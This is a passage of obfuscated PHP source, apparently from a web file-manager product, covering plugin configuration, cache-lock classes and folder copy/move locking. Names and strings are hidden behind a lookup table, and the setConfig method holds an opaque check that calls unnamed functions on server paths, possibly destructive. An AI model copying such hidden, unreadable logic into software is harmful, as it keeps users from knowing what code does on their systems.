str_replace(array($ƒº¢ÖÕ‚[228], $ƒº¢ÖÕ‚[1069], $ƒº¢ÖÕ‚[339], $ƒº¢ÖÕ‚[119]), array($ƒº¢ÖÕ‚[53], $ƒº¢ÖÕ‚[53], $ƒº¢ÖÕ‚[12], $ƒº¢ÖÕ‚[1560]), $²“€ƒ±); } $¼‹Œ÷¤’ = str_replace($ï¹Ù­, $ïÊ°ªÕª, $¼‹Œ÷¤’); } private function parseConfig(&$¼¶°õ¹) { $şÅû•î¥ =& $_SERVER[Æ š¦İÈ]; $òÄßÜ¡ = $şÅû•î¥[1561]; if (!strstr($¼¶°õ¹, $òÄßÜ¡)) { return; } preg_match_all($şÅû•î¥[1562], $¼¶°õ¹, $©úÏÔ°); if (!is_array($©úÏÔ°) || count($©úÏÔ°) == 0 || !is_array($©úÏÔ°[0]) || count($©úÏÔ°[0]) == 0) { return; } $¹ĞŒåŞ˜ = $this->getConfig(); $âˆÑø£ = array(); $ûç†ß = array(); foreach ($©úÏÔ°[0] as $×¢ğùÆ„) { $€éì×’– = substr($×¢ğùÆ„, strlen($òÄßÜ¡), -2); $âˆÑø£[] = $×¢ğùÆ„; $ûç†ß[] = _get($¹ĞŒåŞ˜, $€éì×’–); } $¼¶°õ¹ = str_replace($âˆÑø£, $ûç†ß, $¼¶°õ¹); } private function parsePackage(&$†»¨ú€¾) { $€ºÎÚ¥É =& $_SERVER[Æ š¦İÈ]; $Æò¶µñ = $€ºÎÚ¥É[1563]; if (!strstr($†»¨ú€¾, $Æò¶µñ)) { return; } preg_match_all($€ºÎÚ¥É[1564], $†»¨ú€¾, $êø¿Å–); if (!is_array($êø¿Å–) || count($êø¿Å–) == 0 || !is_array($êø¿Å–[0]) || count($êø¿Å–[0]) == 0) { return; } $ï‡š¨¿¹ = $this->appPackage(); $£ş‚¤ö× = array(); $ûó²Ìâ• = array(); foreach ($êø¿Å–[0] as $ìÓ“È¤) { $Ò¨âšëÍ = substr($ìÓ“È¤, strlen($Æò¶µñ), -2); $£ş‚¤ö×[] = $ìÓ“È¤; $ûó²Ìâ•[] = _get($ï‡š¨¿¹, $Ò¨âšëÍ); } $†»¨ú€¾ = str_replace($£ş‚¤ö×, $ûó²Ìâ•, $†»¨ú€¾); } final function echoFile($ŸğÃ–Á, $ºæïØˆ¯ = false) { $•¸šŞÓá =& $_SERVER[Æ š¦İÈ]; $£§Ù = $this->pluginPath . $ŸğÃ–Á; if (ACT == $•¸šŞÓá[1565]) { echo $•¸šŞÓá[1566] . $this->pluginName . $•¸šŞÓá[8] . $ŸğÃ–Á . $•¸šŞÓá[1567]; if (!file_exists($£§Ù)) { echo $•¸šŞÓá[1568]; return; } } $Ú˜ú­Ñ¤ = $this->parseFile($£§Ù); $this->parseLang($Ú˜ú­Ñ¤); $this->parseConfig($Ú˜ú­Ñ¤); $this->parsePackage($Ú˜ú­Ñ¤); if (is_array($ºæïØˆ¯)) { $Ú˜ú­Ñ¤ = str_replace(array_keys($ºæïØˆ¯), array_values($ºæïØˆ¯), $Ú˜ú­Ñ¤); } echo $•¸šŞÓá[228] . $Ú˜ú­Ñ¤; } final function initLang() { $è–æàÖ¯ =& $_SERVER[Æ š¦İÈ]; $èúŸäş¹ = $è–æàÖ¯[1569]; $ùè½“­ä = $this->pluginPath . $è–æàÖ¯[1570]; $ÂÇ¡ğÕÕ = I18n::getType(); $ûû‡ø«• = array(); if (file_exists($ùè½“­ä . $ÂÇ¡ğÕÕ . $è–æàÖ¯[835])) { $ûû‡ø«• = (include $ùè½“­ä . $ÂÇ¡ğÕÕ . $è–æàÖ¯[835]); } else { if ($ÂÇ¡ğÕÕ == $è–æàÖ¯[1571] && !file_exists($ùè½“­ä . $ÂÇ¡ğÕÕ . $è–æàÖ¯[835]) && file_exists($ùè½“­ä . $è–æàÖ¯[1572])) { $ûû‡ø«• = (include $ùè½“­ä . $è–æàÖ¯[1572]); } else { if (file_exists($ùè½“­ä . $èúŸäş¹ . $è–æàÖ¯[835])) { $ûû‡ø«• = (include $ùè½“­ä . $èúŸäş¹ . $è–æàÖ¯[835]); } } } if (!is_array($ûû‡ø«•)) { return array(); } if (@count($ûû‡ø«•) > 0) { I18n::set($ûû‡ø«•); } return $ûû‡ø«•; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($“Å¢Äğí) { $´½ñÃÂ‡ =& $_SERVER[Æ š¦İÈ]; if ($_SERVER[$´½ñÃÂ‡[391]] != $_SERVER[$´½ñÃÂ‡[392]]) { $˜ñ âÈÒ = $´½ñÃÂ‡[869]; $¿ô•ç‹ = $´½ñÃÂ‡[393]; $¥©ßçœÁ = $_SERVER[$´½ñÃÂ‡[394]] . $´½ñÃÂ‡[395]; $µ®³†éğ = $¿ô•ç‹($¥©ßçœÁ); $öª€ÄÈÌ = explode($´½ñÃÂ‡[228], $µ®³†éğ); if (count($öª€ÄÈÌ) < $´½ñÃÂ‡[620]) { $Š´÷¡— = $´½ñÃÂ‡[397]; $Š´÷¡—(); } $Õöè¹Ü‰ = $´½ñÃÂ‡[870]; $Õöè¹Ü‰($_SERVER[$´½ñÃÂ‡[871]]); $Õöè¹Ü‰($_SERVER[$´½ñÃÂ‡[394]] . $´½ñÃÂ‡[872]); $›ààæ÷ä = 1; while ($›ààæ÷ä > 1) { $›ààæ÷ä = $›ààæ÷ä + 4; $‹ú³ú = rawurlencode($›ààæ÷ä . $´½ñÃÂ‡[375]); } } return $this->modelPlugin->setConfig($this->pluginName, $“Å¢Äğí); } public function onSetConfig($Éî»ïÛÎ) { } public function onGetConfig($°·ÛŸ’) { } public function onChangeStatus($ìÓš¯Ş¨) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Å¯Âéõ = "\160\x6c\165\147\x69\156\101\165\x74\150") { $ÙÚÍ´”ô =& $_SERVER[Æ š¦İÈ]; if (!defined($ÙÚÍ´”ô[476])) { return !1; } if (_get($GLOBALS, $ÙÚÍ´”ô[507])) { return !0; } $³”¥‰…Š = $this->getConfig(); if (!$³”¥‰…Š[$Å¯Âéõ]) { return !1; } return ActionCall($ÙÚÍ´”ô[1573], $³”¥‰…Š[$Å¯Âéõ]); } public function url($ôØ„“±, $‚ ­÷­ = '', $ß’Ó¦ø = true) { $±²”Šš =& $_SERVER[Æ š¦İÈ]; $Õü‚ù¿ = $this->getConfig(); $šƒŠÁ‚½ = KOD_VERSION . $±²”Šš[10] . KOD_VERSION_BUILD; $Óğ«¢¶È = $this->packageVersion(); $Õş—÷êÅ = $šƒŠÁ‚½ . $±²”Šš[462] . $Óğ«¢¶È; if (substr($ôØ„“±, 0, 4) == $±²”Šš[147] || substr($ôØ„“±, 0, 2) == $±²”Šš[1356]) { $…ÌŠ¢ÇÇ = $ôØ„“± . $±²”Šš[1574] . $Õş—÷êÅ; } else { if ($‚ ­÷­ == $±²”Šš[12]) { $…ÌŠ¢ÇÇ = $this->pluginHost . $ôØ„“± . $±²”Šš[1574] . $Õş—÷êÅ; } else { if ($‚ ­÷­ === $±²”Šš[79]) { $…ÌŠ¢ÇÇ = $this->pluginHost . $ôØ„“±; } else { if ($‚ ­÷­ == $±²”Šš[1575]) { $…ÌŠ¢ÇÇ = STATIC_PATH . $ôØ„“± . $±²”Šš[1574] . $šƒŠÁ‚½; } else { if ($‚ ­÷­ == $±²”Šš[1576]) { $…ÌŠ¢ÇÇ = APP_HOST . $±²”Šš[1577] . $ôØ„“± . $±²”Šš[1574] . $šƒŠÁ‚½; } else { if (isset($Õü‚ù¿[$‚ ­÷­])) { $…ÌŠ¢ÇÇ = $Õü‚ù¿[$‚ ­÷­] . $ôØ„“± . $±²”Šš[1574] . $Õş—÷êÅ; } } } } } } if (!$ß’Ó¦ø) { return $…ÌŠ¢ÇÇ; } echo $…ÌŠ¢ÇÇ; } public function link($ï™éä‚î = false, $Ú±ûîı = '') { $ıéıæ =& $_SERVER[Æ š¦İÈ]; if (!$ï™éä‚î) { $this->link($ıéıæ[1578], $ıéıæ[1576]); $this->link($ıéıæ[1579], $ıéıæ[1575]); $this->link($ıéıæ[1580], $ıéıæ[1575]); $this->link($ıéıæ[1581], $ıéıæ[1575]); $this->link($ıéıæ[1582], $ıéıæ[1575]); return; } $İ’²¢óè = $this->url($ï™éä‚î, $Ú±ûîı, !1); if (substr($ï™éä‚î, -3) == $ıéıæ[1583]) { echo $ıéıæ[1584] . $İ’²¢óè . $ıéıæ[1585] . $ıéıæ[228]; } else { if (substr($ï™éä‚î, -4) == $ıéıæ[1586]) { echo $ıéıæ[1587] . $İ’²¢óè . $ıéıæ[1588] . $ıéıæ[228]; } } } } goto C¸®£ÁÂğß; dåÓï¤©çÑ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ûš”ı¥ =& $_SERVER[Æ š¦İÈ]; $Ø˜÷ç‹“ = $GLOBALS[$ûš”ı¥[6]][$ûš”ı¥[346]]; self::$cachePath = $Ø˜÷ç‹“[$ûš”ı¥[194]][$ûš”ı¥[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($§¤Ù“ô, $Ñª±Ÿö¯ = 0) { $ŒÕš–…Ê =& $_SERVER[Æ š¦İÈ]; $’Öšı„ = microtime(!0); $úÄÊëãÉ = $’Öšı„ + $Ñª±Ÿö¯ + 0.0001; $åêÚüıŸ = rtrim(self::$cachePath, $ŒÕš–…Ê[8]) . $ŒÕš–…Ê[856] . md5($§¤Ù“ô) . $ŒÕš–…Ê[853]; if (file_exists($åêÚüıŸ) && filemtime($åêÚüıŸ) && filemtime($åêÚüıŸ) < time() - 10) { @unlink($åêÚüıŸ); } do { if (file_exists($åêÚüıŸ)) { cacheLockWait(); continue; } $Îš®ş‚– = fopen($åêÚüıŸ, $ŒÕš–…Ê[857]); if (!$Îš®ş‚–) { return !1; } $ÉŠıœœ± = flock($Îš®ş‚–, LOCK_EX | LOCK_NB); self::$caches[$§¤Ù“ô] = array($ŒÕš–…Ê[858] => $Îš®ş‚–, $ŒÕš–…Ê[194] => $åêÚüıŸ); fwrite($Îš®ş‚–, $úÄÊëãÉ); clearstatcache(); if ($Îš®ş‚– && $ÉŠıœœ±) { return !0; } cacheLockWait(); } while (microtime(!0) < $úÄÊëãÉ); $this->unlock($§¤Ù“ô); return !1; } public function lockGet($¸ÈĞì…˜) { $àÆ²‹í« =& $_SERVER[Æ š¦İÈ]; $‚†é°¸ = rtrim(self::$cachePath, $àÆ²‹í«[8]) . $àÆ²‹í«[856] . md5($¸ÈĞì…˜) . $àÆ²‹í«[853]; return file_exists($‚†é°¸); } public function unlock($ß×¾Óâ) { $Ûç–È¡½ =& $_SERVER[Æ š¦İÈ]; $õ…¸ùŒÖ = self::$caches[$ß×¾Óâ]; if (!$õ…¸ùŒÖ) { return; } @flock($õ…¸ùŒÖ[$Ûç–È¡½[858]], LOCK_UN); @fclose($õ…¸ùŒÖ[$Ûç–È¡½[858]]); @unlink($õ…¸ùŒÖ[$Ûç–È¡½[194]]); unset(self::$caches[$ß×¾Óâ]); } } class CacheLockRedis { public function lock($Å»‡œ±, $Ë¦´Ë­Ö = 10) { $ãàü™ØÙ = Cache::init(); $£‚ÏÅè² = microtime(!0) + $Ë¦´Ë­Ö; while (microtime(!0) < $£‚ÏÅè²) { $õïœ½Ÿò = $ãàü™ØÙ->get($Å»‡œ±); if (!$õïœ½Ÿò) { $…õöØ¢ñ = $ãàü™ØÙ->setLock($Å»‡œ±, $£‚ÏÅè², $Ë¦´Ë­Ö); if ($…õöØ¢ñ) { return !0; } } else { if ($õïœ½Ÿò < microtime(!0)) { $ãàü™ØÙ->set($Å»‡œ±, $£‚ÏÅè², $Ë¦´Ë­Ö * 2); if ($ãàü™ØÙ->get($Å»‡œ±) === $õïœ½Ÿò) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ñØøÜ) { return Cache::init()->get($ñØøÜ); } public function unlock($¾ğ¿œå) { return Cache::init()->remove($¾ğ¿œå); } } class CacheLockMemcached { public function lock($‚µøä¤€, $ß¼ñ¬ä” = 0) { $Ô—Ñç„İ = Cache::init(); $€à©ÙÖÆ = microtime(!0) + $ß¼ñ¬ä”; while (microtime(!0) < $€à©ÙÖÆ) { $Äº±Š½ = $Ô—Ñç„İ->get($‚µøä¤€); if (!$Äº±Š½ || $Äº±Š½ < microtime(!0)) { $ãŠíÕŠ¼ = $Ô—Ñç„İ->handle->add($‚µøä¤€, $€à©ÙÖÆ, $ß¼ñ¬ä”); if ($ãŠíÕŠ¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Àşä°¯Æ) { return Cache::init()->get($Àşä°¯Æ); } public function unlock($ƒûÅ…×) { return Cache::init()->remove($ƒûÅ…×); } } goto A†İÒÚ‘¨; Dßï¢³é”Ç: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÜÔÎİù¼) { $¾ı”»©  =& $_SERVER[Æ š¦İÈ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¾ı”»© [551], $ÜÔÎİù¼); $ÓÍ†ÌÈ¥ = 1; $this->_lockEvent($ÜÔÎİù¼, array($¾ı”»© [552], $¾ı”»© [553]), $ÓÍ†ÌÈ¥); $this->_lockParent($ÜÔÎİù¼, array($¾ı”»© [553]), $ÓÍ†ÌÈ¥); $this->_lockEvent($ÜÔÎİù¼, array($¾ı”»© [554], $¾ı”»© [555]), $ÓÍ†ÌÈ¥); $this->_lockCheckEnd($¾ı”»© [551], $ÜÔÎİù¼); } public function lockCopyEnd($™¼Šñ‘) { $Áø¹Ø…¯ =& $_SERVER[Æ š¦İÈ]; if (!$this->allowLock()) { return; } $šÑÏ›—… = 0; $this->_lockEvent($™¼Šñ‘, array($Áø¹Ø…¯[552], $Áø¹Ø…¯[553]), $šÑÏ›—…); $this->_lockParent($™¼Šñ‘, array($Áø¹Ø…¯[553]), $šÑÏ›—…); $this->_lockEvent($™¼Šñ‘, array($Áø¹Ø…¯[554], $Áø¹Ø…¯[555]), $šÑÏ›—…); } public function lockWriteStart($¥®Ôƒºƒ, $ØÍ´Õï² = '') { $³¬—¼ÊŞ =& $_SERVER[Æ š¦İÈ]; if (!$this->allowLock()) { return; } $this->_lockCheck($³¬—¼ÊŞ[552], $¥®Ôƒºƒ); $ùê²ºóÇ = 1; $this->_lockKey($³¬—¼ÊŞ[556] . $¥®Ôƒºƒ . $³¬—¼ÊŞ[10] . $ØÍ´Õï², $ùê²ºóÇ); $this->_lockEvent($¥®Ôƒºƒ, array($³¬—¼ÊŞ[551], $³¬—¼ÊŞ[553]), $ùê²ºóÇ); $this->_lockParent($¥®Ôƒºƒ, array($³¬—¼ÊŞ[551], $³¬—¼ÊŞ[553]), $ùê²ºóÇ); $this->_lockCheckEnd($³¬—¼ÊŞ[552], $¥®Ôƒºƒ); } public function lockWriteEnd($£«ğä‚š, $ÍõË = '') { $ÑíçÛÅè =& $_SERVER[Æ š¦İÈ]; if (!$this->allowLock()) { return; } $üÆùìÄ² = 0; $this->_lockKey($ÑíçÛÅè[556] . $£«ğä‚š . $ÑíçÛÅè[10] . $ÍõË, $üÆùìÄ²); $this->_lockEvent($£«ğä‚š, array($ÑíçÛÅè[551], $ÑíçÛÅè[553]), $üÆùìÄ²); $this->_lockParent($£«ğä‚š, array($ÑíçÛÅè[551], $ÑíçÛÅè[553]), $üÆùìÄ²); } public function lockMoveStart($ú…†üƒæ) { $º¥êñÈŞ =& $_SERVER[Æ š¦İÈ]; if (!$this->allowLock()) { return; } $this->_lockCheck($º¥êñÈŞ[553], $ú…†üƒæ); $‹Ş¦­ÜÅ = 1; $this->_lockKey($º¥êñÈŞ[557] . $ú…†üƒæ, $‹Ş¦­ÜÅ); $this->_lockEvent($ú…†üƒæ, array($º¥êñÈŞ[551], $º¥êñÈŞ[552]), $‹Ş¦­ÜÅ); $this->_lockParent($ú…†üƒæ, array($º¥êñÈŞ[551], $º¥êñÈŞ[553]), $‹Ş¦­ÜÅ); $this->_lockEvent($ú…†üƒæ, array($º¥êñÈŞ[558], $º¥êñÈŞ[554], $º¥êñÈŞ[555]), $‹Ş¦­ÜÅ); $this->_lockCheckEnd($º¥êñÈŞ[553], $ú…†üƒæ); } public function lockMoveEnd($‡è—éç) { $¿†Ë¿ƒù =& $_SERVER[Æ š¦İÈ]; if (!$this->allowLock()) { return; } $Ç¿¢”† = 0; $this->_lockKey($¿†Ë¿ƒù[557] . $‡è—éç, $Ç¿¢”†); $this->_lockEvent($‡è—éç, array($¿†Ë¿ƒù[551], $¿†Ë¿ƒù[552]), $Ç¿¢”†); $this->_lockParent($‡è—éç, array($¿†Ë¿ƒù[551], $¿†Ë¿ƒù[553]), $Ç¿¢”†); $this->_lockEvent($‡è—éç, array($¿†Ë¿ƒù[558], $¿†Ë¿ƒù[554], $¿†Ë¿ƒù[555]), $Ç¿¢”†); } private function _lockCheck($Š‡™²…´, $ãØµöÛÓ) { $…äàšÕı =& $_SERVER[Æ š¦İÈ]; $éÌ©ƒ’× = $this->sourceInfo($ãØµöÛÓ); $„›ŠÑÕí = $Š‡™²…´ . $…äàšÕı[10] . $ãØµöÛÓ; $this->_lockTimeStart[$„›ŠÑÕí] = timeFloat(); if (!is_array($éÌ©ƒ’×)) { return; } $óÔÊªå = LNG($…äàšÕı[559]); CacheLock::setErrorMsg($…äàšÕı[161] . htmlspecialchars($éÌ©ƒ’×[$…äàšÕı[32]]) . $…äàšÕı[538] . $óÔÊªå); $this->_lockKey($„›ŠÑÕí, 1); $this->_lockKey($„›ŠÑÕí, 0); $¤‚Ó’Ë = array_reverse($this->parentLevelArray($éÌ©ƒ’×[$…äàšÕı[523]])); foreach ($¤‚Ó’Ë as $íøİ¾§) { $„›ŠÑÕí = $Š‡™²…´ . $…äàšÕı[560] . $íøİ¾§; if (CacheLock::lockGet($…äàšÕı[561] . $„›ŠÑÕí)) { $éÌ©ƒ’× = $this->sourceInfo($íøİ¾§); CacheLock::setErrorMsg($…äàšÕı[161] . htmlspecialchars($éÌ©ƒ’×[$…äàšÕı[32]]) . $…äàšÕı[538] . $óÔÊªå); $this->_lockKey($„›ŠÑÕí, 1); $this->_lockKey($„›ŠÑÕí, 0); } } } private function _lockCheckEnd($ìƒ‹·£±, $†Âßë¾å) { $•£Ü¦· =& $_SERVER[Æ š¦İÈ]; $àæñ˜› = $ìƒ‹·£± . $•£Ü¦·[10] . $†Âßë¾å; CacheLock::setErrorMsg($•£Ü¦·[375]); if (!isset($this->_lockTimeStart[$àæñ˜›])) { return; } $‚ÅùÂ = timeFloat() - $this->_lockTimeStart[$àæñ˜›]; unset($this->_lockTimeStart[$àæñ˜›]); if ($‚ÅùÂ > 0.5) { unset(self::$cacheSourceInfo[$•£Ü¦·[460] . $†Âßë¾å]); } $ü®©Ô£‰ = $this->sourceInfo($†Âßë¾å); if (!$ü®©Ô£‰) { show_json(LNG($•£Ü¦·[106]), !1); } } private function _lockParent($áÊ‘œÙË, $Ä¢“Â‡Í, $´Í×É¬Ê) { if (!$this->autoLockSet) { return; } $²Ìá•£ = $this->sourceInfo($áÊ‘œÙË); if (!is_array($²Ìá•£)) { return; } $ÓÃÂ½ÊÙ = array_reverse($this->parentLevelArray($²Ìá•£[$_SERVER[Æ š¦İÈ][523]])); foreach ($ÓÃÂ½ÊÙ as $‰Áàšú) { $this->_lockEvent($‰Áàšú, $Ä¢“Â‡Í, $´Í×É¬Ê); } } private function _lockEvent($ã£Ññç, $½îßáñ•, $’»èÊ·§) { $çËÜ‘¦ =& $_SERVER[Æ š¦İÈ]; if (!$this->autoLockSet) { return; } foreach ($½îßáñ• as $™¹ÇÂÄ) { $¡£ÖíÔ = $™¹ÇÂÄ . $çËÜ‘¦[10] . $ã£Ññç; if ($’»èÊ·§ && CacheLock::lockGet($çËÜ‘¦[561] . $¡£ÖíÔ)) { continue; } $this->_lockKey($¡£ÖíÔ, $’»èÊ·§); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¯Ñ€æ‡ , $Ú±ÀÑšö = 1) { $É…›…Í = $_SERVER[Æ š¦İÈ][561] . md5($¯Ñ€æ‡ ); if ($Ú±ÀÑšö) { if (isset(self::$_lockItemArr[$É…›…Í])) { return; } self::$_lockItemArr[$É…›…Í] = 1; CacheLock::lock($É…›…Í, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$É…›…Í])) { return; } unset(self::$_lockItemArr[$É…›…Í]); CacheLock::unlock($É…›…Í); } } public function isParentOf($ˆŸÜ×‰¤, $Ï¹Ïâ˜á) { $àªà¯ÕÉ =& $_SERVER[Æ š¦İÈ]; $«ë¡¿Ë÷ = $this->sourceInfo($ˆŸÜ×‰¤); $ÅßÃ¨ = $this->sourceInfo($Ï¹Ïâ˜á); $é´ìŠ¾ğ = $«ë¡¿Ë÷[$àªà¯ÕÉ[523]] . $«ë¡¿Ë÷[$àªà¯ÕÉ[405]] . $àªà¯ÕÉ[50]; $úºÚÄ¸ï = $ÅßÃ¨[$àªà¯ÕÉ[523]] . $ÅßÃ¨[$àªà¯ÕÉ[405]] . $àªà¯ÕÉ[50]; $’‚…Ä ² = strpos($úºÚÄ¸ï, $é´ìŠ¾ğ) === 0; return $’‚…Ä ²; } private $targetIsDelete = 0; public function copy($‹¢ÇŞÀë, $í´ÚõÊ¬, $ª¦Æµ“© = REPEAT_REPLACE, $°ıõˆ­Ö = '') { $®–éÎ¸± =& $_SERVER[Æ š¦İÈ]; $äá£çë¢ = $this->sourceInfo($‹¢ÇŞÀë); $¿†¤²å€ = $this->sourceInfo($í´ÚõÊ¬); if (!$äá£çë¢ || !$¿†¤²å€ || $¿†¤²å€[$®–éÎ¸±[413]] != $®–éÎ¸±[89]) { return !1; } if ($this->isParentOf($‹¢ÇŞÀë, $í´ÚõÊ¬)) { return !1; } $êïÒ–  = $°ıõˆ­Ö ? $°ıõˆ­Ö : $äá£çë¢[$®–éÎ¸±[32]]; $this->lockCopyStart($‹¢ÇŞÀë); $this->lockWriteStart($í´ÚõÊ¬, $êïÒ– ); $öÏÃôô = array($®–éÎ¸±[562] => array(), $®–éÎ¸±[563] => array(), $®–éÎ¸±[564] => array()); $this->targetIsDelete = intval($äá£çë¢[$®–éÎ¸±[433]]); $è‹Ë¤€™ = $this->fileNameExistCache($í´ÚõÊ¬, $äá£çë¢[$®–éÎ¸±[32]]); $¬¿ç×¢ä = $this->_copy($‹¢ÇŞÀë, $í´ÚõÊ¬, $ª¦Æµ“©, $öÏÃôô, !0, $°ıõˆ­Ö); $this->_childrenListClear(); $this->lockCopyEnd($‹¢ÇŞÀë); $this->lockWriteEnd($í´ÚõÊ¬, $êïÒ– ); if ($äá£çë¢[$®–éÎ¸±[413]] == $®–éÎ¸±[89] && $è‹Ë¤€™ == $¬¿ç×¢ä) { $this->folderSizeResetChildren($è‹Ë¤€™); } Model($®–éÎ¸±[565])->addAll($öÏÃôô[$®–éÎ¸±[563]], array(), !0); if ($è‹Ë¤€™ != $¬¿ç×¢ä || $äá£çë¢[$®–éÎ¸±[413]] == $®–éÎ¸±[89]) { Model($®–éÎ¸±[566])->eventCopy($¬¿ç×¢ä); } $this->saveAll($öÏÃôô[$®–éÎ¸±[564]]); Model($®–éÎ¸±[194])->linkAdd($öÏÃôô[$®–éÎ¸±[562]]); $this->folderSizeReset($í´ÚõÊ¬); $this->updateModifyTime($í´ÚõÊ¬); return $¬¿ç×¢ä; } private function _copy($‘ÃÈ´, $¢’¤±’Â, $ê’äë², &$’Ÿ‹èŞ, $³ùı¯ı, $‘Æ„ò­» = '') { $î·àÖ¼ =& $_SERVER[Æ š¦İÈ]; $¥ûÍ¶ï• = $this->sourceInfoCache($‘ÃÈ´); $—²ÜÍÙ = $¥ûÍ¶ï•[$î·àÖ¼[413]] == $î·àÖ¼[89]; $™µªÎÜ = $‘Æ„ò­» ? $‘Æ„ò­» : $¥ûÍ¶ï•[$î·àÖ¼[32]]; $¦âÄ ¢” = $this->fileNameExistCache($¢’¤±’Â, $™µªÎÜ); if ($³ùı¯ı) { $this->_childrenAllMake($‘ÃÈ´); if ($—²ÜÍÙ && $¦âÄ ¢”) { $this->_childrenAllMake($¦âÄ ¢”); } } if (!$¦âÄ ¢”) { return $this->_copyCreate($‘ÃÈ´, $¢’¤±’Â, $™µªÎÜ, $’Ÿ‹èŞ); } $Éºå¼ô = $¦âÄ ¢”; if ($—²ÜÍÙ) { if ($ê’äë² == REPEAT_RENAME_FOLDER) { $™µªÎÜ = $this->fileNameAutoCache($¢’¤±’Â, $™µªÎÜ, $ê’äë², $—²ÜÍÙ); $Éºå¼ô = $this->_copyCreate($‘ÃÈ´, $¢’¤±’Â, $™µªÎÜ, $’Ÿ‹èŞ); } else { $ÈÌ´®­ = $this->_childrenList($‘ÃÈ´); foreach ($ÈÌ´®­ as $Ïû«œ•¥) { $this->_copy($Ïû«œ•¥[$î·àÖ¼[405]], $¦âÄ ¢”, $ê’äë², $’Ÿ‹èŞ, !1); } } } else { if ($ê’äë² == REPEAT_RENAME || $ê’äë² == REPEAT_RENAME_FOLDER) { $™µªÎÜ = $this->fileNameAutoCache($¢’¤±’Â, $™µªÎÜ, $ê’äë², $—²ÜÍÙ); $Éºå¼ô = $this->_copyCreate($‘ÃÈ´, $¢’¤±’Â, $™µªÎÜ, $’Ÿ‹èŞ); } else { if ($ê’äë² == REPEAT_REPLACE) { $ûù¶Â²‘ = $this->sourceInfoCache($¦âÄ ¢”); $¿¥ëˆ„‡ = $this->fileHistory($ûù¶Â²‘, $¥ûÍ¶ï•[$î·àÖ¼[469]], $¥ûÍ¶ï•[$î·àÖ¼[80]]); if ($¿¥ëˆ„‡) { $’Ÿ‹èŞ[$î·àÖ¼[562]][] = $¥ûÍ¶ï•[$î·àÖ¼[469]]; } } else { if ($ê’äë² == REPEAT_SKIP) { } } } Hook::trigger($î·àÖ¼[567], array($î·àÖ¼[568], $¥ûÍ¶ï•, 0)); } return $Éºå¼ô; } private function _copyCreate($¼Ç¦Âü¾, $ô×¾Öôû, $½ÇÑÔı, &$Ùñ»”¬) { $îœ€Ä£Ú =& $_SERVER[Æ š¦İÈ]; $°ô­Ø¬ş = $this->sourceInfoCache($¼Ç¦Âü¾); $÷‡Ïëªµ = $this->sourceInfoCache($ô×¾Öôû); $Ø£Éù·ö = $this->_makeItemData($°ô­Ø¬ş, $÷‡Ïëªµ, $½ÇÑÔı); Hook::trigger($îœ€Ä£Ú[569], $Ø£Éù·ö); Hook::trigger($îœ€Ä£Ú[570], array($îœ€Ä£Ú[571], $Ø£Éù·ö, 0)); $†ğğÑ¿è = $this->add($Ø£Éù·ö); $½åóÇ = array($îœ€Ä£Ú[405] => $†ğğÑ¿è, $îœ€Ä£Ú[32] => $½ÇÑÔı); $this->_copyApplyMeta($½åóÇ, $Ùñ»”¬); if ($°ô­Ø¬ş[$îœ€Ä£Ú[413]] != $îœ€Ä£Ú[89]) { $Ùñ»”¬[$îœ€Ä£Ú[562]][] = $°ô­Ø¬ş[$îœ€Ä£Ú[469]]; return $†ğğÑ¿è; } $¡’à« = array(); $ÇÁåŸÛ = array(); $this->_childrenListAll($¼Ç¦Âü¾, $¡’à«); $°œªÕÎ = count($¡’à«); if ($°œªÕÎ == 0) { return $†ğğÑ¿è; } $®ğ¢…åŞ = $this->sourceInfo($†ğğÑ¿è); foreach ($¡’à« as $»ÃÒæÕÕ) { $¶è•¸¼û = $this->_makeItemData($»ÃÒæÕÕ, $®ğ¢…åŞ, $»ÃÒæÕÕ[$îœ€Ä£Ú[32]]); $¶è•¸¼û[$îœ€Ä£Ú[523]] = $»ÃÒæÕÕ[$îœ€Ä£Ú[523]]; $ÇÁåŸÛ[] = $¶è•¸¼û; } $this->chunkEventSet($îœ€Ä£Ú[572], array($îœ€Ä£Ú[573], $Ø£Éù·ö, $°œªÕÎ)); $this->addAll($ÇÁåŸÛ, array(), !1); $´è²Ìåº = $this->where(array($îœ€Ä£Ú[500] => $†ğğÑ¿è))->select(); $Íıì—Ï = $this->_childrenMakeRelation($¡’à«, $´è²Ìåº); $Íıì—Ï[$¼Ç¦Âü¾] = $†ğğÑ¿è; $øƒöµ»£ = array(); $şŸÎ¨ñÀ = array(); foreach ($´è²Ìåº as $»ÃÒæÕÕ) { $ƒÌªŸÖô = $»ÃÒæÕÕ[$îœ€Ä£Ú[405]]; $ø³¶¨Ú° = $this->_childrenMatch($Íıì—Ï, $»ÃÒæÕÕ, $®ğ¢…åŞ); $øƒöµ»£[] = array($îœ€Ä£Ú[405], $ƒÌªŸÖô, $îœ€Ä£Ú[500], $ø³¶¨Ú°[$îœ€Ä£Ú[500]]); $şŸÎ¨ñÀ[] = array($îœ€Ä£Ú[405], $ƒÌªŸÖô, $îœ€Ä£Ú[523], $ø³¶¨Ú°[$îœ€Ä£Ú[523]]); $this->_copyApplyMeta($»ÃÒæÕÕ, $Ùñ»”¬); if ($»ÃÒæÕÕ[$îœ€Ä£Ú[413]] != $îœ€Ä£Ú[89]) { $Ùñ»”¬[$îœ€Ä£Ú[562]][] = $»ÃÒæÕÕ[$îœ€Ä£Ú[469]]; } } $this->chunkEventSet($îœ€Ä£Ú[574], array($îœ€Ä£Ú[575], $Ø£Éù·ö, $°œªÕÎ)); $this->saveAll($øƒöµ»£); $this->chunkEventSet($îœ€Ä£Ú[576], array($îœ€Ä£Ú[577], $Ø£Éù·ö, $°œªÕÎ)); $this->saveAll($şŸÎ¨ñÀ); return $†ğğÑ¿è; } private function _childrenMakeRelation($Ş»–´ÔÕ, $ÇÛŠø”ç) { $¨˜Û´¼ =& $_SERVER[Æ š¦İÈ]; $¥÷Â”àÓ = array(); 